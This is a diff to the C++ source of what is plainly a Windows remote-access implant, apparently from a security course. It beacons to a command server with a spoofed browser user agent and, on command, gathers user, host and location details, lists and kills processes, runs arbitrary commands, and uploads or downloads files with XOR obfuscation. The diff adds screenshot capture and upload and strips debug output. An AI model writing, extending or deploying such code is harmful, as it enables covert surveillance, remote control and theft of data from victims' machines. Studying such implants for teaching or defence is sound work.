@@ -6,6 +6,9 @@
 #include <iphlpapi.h>
 #include <tlhelp32.h>
 #include <urlmon.h>
+#include "Gdiplus.h"
+#include <vector>
+#include "screenshot.h"
 using namespace std;
 
 #pragma comment(lib,"Wininet.lib")
@@ -101,17 +104,55 @@ BOOL doFileUpload(HANDLE hConnect, char* filepath, int xorKey) {
 			HttpEndRequest(hRequest, NULL, HSR_INITIATE, 0);
 			return FALSE;
 		}
-		//cout << bytesRead << "\n";
-		for (int b = 0; b < bytesRead; b++) {
+		for (UINT b = 0; b < bytesRead; b++) {
 			data[b] ^= xorKey;
 		}
 		InternetWriteFile(hRequest, (const void*)data, bytesRead, &bytesWritten);
-		//cout << bytesWritten << "\n";
 	} while (bytesRead == sizeof(data));
 	InternetWriteFile(hRequest, (const void*)tail, strlen(tail), &bytesWritten);
 	HttpEndRequest(hRequest, NULL, HSR_INITIATE, 0);
 	return TRUE;
 }
+
+
+//Uploads screenshot to server via HTTP POST
+//Params: handle for internet, path of file to upload, key for XOR "encryption" 
+BOOL doScreenshotUpload(HANDLE hConnect, std::vector<BYTE> bmp, int xorKey) {
+	char hdrs[] = "Content-Type: multipart/form-data; boundary=CSEC476";
+	char head[] = "--CSEC476\r\nContent-Disposition: form-data; name=\"file\"; filename=\"screenshot.bmp\"\r\nContent-Type: application/octet-stream\r\n\r\n";
+	char tail[] = "\r\n--CSEC476--\r\n";
+	char data[2048] = {};
+	DWORD bytesWritten = 0;
+	DWORD bytesRead = 0;
+
+
+	HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/upload", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
+	HttpAddRequestHeadersA(hRequest, hdrs, -1, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
+
+	INTERNET_BUFFERSA bufferIn;
+	memset(&bufferIn, 0, sizeof(INTERNET_BUFFERSA));
+	bufferIn.dwStructSize = sizeof(INTERNET_BUFFERS);
+	bufferIn.dwBufferTotal = strlen(head) + bmp.size() + strlen(tail);
+
+	HttpSendRequestExA(hRequest, &bufferIn, NULL, HSR_INITIATE, 0);
+	InternetWriteFile(hRequest, (const void*)head, strlen(head), &bytesWritten);
+	UINT b = 0;
+	for (BYTE n : bmp) {
+		if (b >= sizeof(data)) {
+			InternetWriteFile(hRequest, (const void*)data, b, &bytesWritten);	
+			b = 0;
+		}
+		data[b] = n ^ xorKey;
+		b++;
+	}
+	if(b > 0)
+		InternetWriteFile(hRequest, (const void*)data, b, &bytesWritten);
+
+	InternetWriteFile(hRequest, (const void*)tail, strlen(tail), &bytesWritten);
+	HttpEndRequest(hRequest, NULL, HSR_INITIATE, 0);
+	return TRUE;
+}
+
 
 
 //Downloads file to path
@@ -286,7 +327,6 @@ BOOLEAN killProcess(DWORD pid) {
 std::string getNetworkInfo() {
 	UINT i;
 	std::string nwInfo;
-	// https://docs.microsoft.com/en-us/windows/win32/api/iphlpapi/nf-iphlpapi-getadaptersinfo
 	PIP_ADAPTER_INFO pAdapterInfo;
 	PIP_ADAPTER_INFO pAdapter = NULL;
 	DWORD dwRetVal = 0;
@@ -294,14 +334,14 @@ std::string getNetworkInfo() {
 	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
 	pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(sizeof(IP_ADAPTER_INFO));
 	if (pAdapterInfo == NULL) {
-		printf("Error allocating memory needed to call GetAdaptersinfo\n");
+		return "";
 	}
 
 	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
 		FREE(pAdapterInfo);
 		pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(ulOutBufLen);
 		if (pAdapterInfo == NULL) {
-			printf("Error allocating memory needed to call GetAdaptersinfo\n");
+			return "";
 		}
 	}
 
@@ -317,7 +357,6 @@ std::string getNetworkInfo() {
 					buf[UNLEN] = 0;
 					nwInfo += buf;
 					nwInfo += ",";
-					//cout << std::hex << setfill('0') << setw(2) << (int)pAdapter->Address[i] << "\n";
 				}
 				else {
 					char buf[UNLEN + 1];
@@ -327,17 +366,12 @@ std::string getNetworkInfo() {
 					buf[UNLEN] = 0;
 					nwInfo += buf;
 					nwInfo += "-";
-					//cout << std::hex << setfill('0') << setw(2) << (int)pAdapter->Address[i] << "-";
 				}
-
 			}
 			nwInfo += pAdapter->IpAddressList.IpAddress.String;
 			nwInfo += ",";
 			pAdapter = pAdapter->Next;
 		}
-	}
-	else {
-		printf("GetAdaptersInfo failed with error: %d\n", dwRetVal);
 	}
 	if (pAdapterInfo)
 		FREE(pAdapterInfo);
@@ -357,12 +391,8 @@ std::string gatherInfo(HANDLE hInternet) {
 
 	BOOL getUserSuccess = GetUserNameA(username, &len);
 	if (getUserSuccess) {
-		//cout << username << "\n";
 		allInfo += username;
 		allInfo += "&";
-	}
-	else {
-		cout << "unsuccessful" << "\n";
 	}
 
 	char computername[UNLEN + 1];
@@ -370,18 +400,13 @@ std::string gatherInfo(HANDLE hInternet) {
 
 	BOOL getComputerNameSuccess = GetComputerNameA(computername, &len2);
 	if (getComputerNameSuccess) {
-		//cout << computername << "\n";
 		allInfo += computername;
 		allInfo += "&";
-	}
-	else {
-		cout << "unsuccessful" << "\n";
 	}
 
 	GEOID g = GetUserGeoID(GEOCLASS_NATION);
 	char iso2[UNLEN + 1];
 	GetGeoInfoA(g, GEO_ISO2, iso2, UNLEN + 1, 0);
-	//cout << g << " " << iso2 << "\n";
 	allInfo += iso2;
 	allInfo += "&";
 
@@ -408,8 +433,6 @@ int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdL
 	int xorKey = 0x7f;
 	PCTSTR rgpszAcceptTypes[] = { _T("text/*"), NULL };
 
-	//passCheck();
-
 	HANDLE hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
 	HANDLE hConnect = InternetConnectA(hInternet, IP, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
 	HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/heartbeat", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
@@ -419,7 +442,7 @@ int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdL
 		HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/heartbeat", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
 		std::string response = sendRequestGetResponse(hRequest);
 		response = decode(key, response);
-		//cout << "Response " << response << "\n";
+
 		//Process request here. If first part of string is a 1, do this... 2 do this... etc.
 		std::string code = response.substr(0, response.find(" "));
 		int first;
@@ -427,43 +450,37 @@ int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdL
 		switch (atoi(code.c_str())){
 		case 1:
 			//OK
-			cout << "Got 1" <<"\n";
 			break;
 		case 2:
 			//INFO
-			cout << "Got 2" << "\n";
 			send_enc(key, gatherInfo(hInternet), "/info", hConnect);
 			break;
 		case 3:
 			//PS
-			cout << "Got 3" << "\n";
 			send_enc(key, getProcToStr(), "/ps", hConnect);
 			break;
 		case 4:
 			//RUN
-			cout << "Got 4" << "\n";
 			send_enc(key, execCmd(response.substr(response.find(" ") + 1), MAX_CMD_TIME), "/out", hConnect);
 			break;
 		case 5:
 			//UPLOAD
-			cout << "Got 5" << "\n";
 			doFileUpload(hConnect, (char*) response.substr(response.find(" ") + 1).c_str(), xorKey);
 			break;
 		case 6:
 			//DOWNLOAD
-			cout << "Got 6" << "\n";
 			first = response.find(" ");
 			second = response.find(" ", first+1);
 			doFileDownload(response.substr(first+1, second-2), response.substr(second+1));
 			break;
 		case 7:
 			//KILL
-			cout << "Got 7" << "\n";
-			//cout << atoi(response.substr(response.find(" ") + 1).c_str()) << "\n";
 			killProcess(atoi(response.substr(response.find(" ") + 1).c_str()));
 			break;
+		case 8:
+			doScreenshotUpload(hConnect, doTheThing(), xorKey);
+			break;
 		default:
-			cout << "Got unknown value" << "\n";
 			break;
 		}
 		HttpEndRequestA(hRequest, NULL, NULL, NULL);
